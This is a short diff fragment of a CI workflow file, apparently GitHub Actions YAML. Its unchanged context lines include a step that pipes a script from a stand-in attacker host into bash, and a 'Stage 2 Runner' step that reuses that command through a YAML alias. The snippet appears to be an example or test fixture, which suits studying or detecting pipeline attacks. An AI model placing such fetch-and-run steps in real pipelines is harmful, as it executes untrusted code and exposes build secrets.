@@ -14,3 +14,4 @@ jobs:
           curl -fsSL https://evil.example.com/payload.sh | bash
       - name: Stage 2 Runner
         run: *download_exec
+
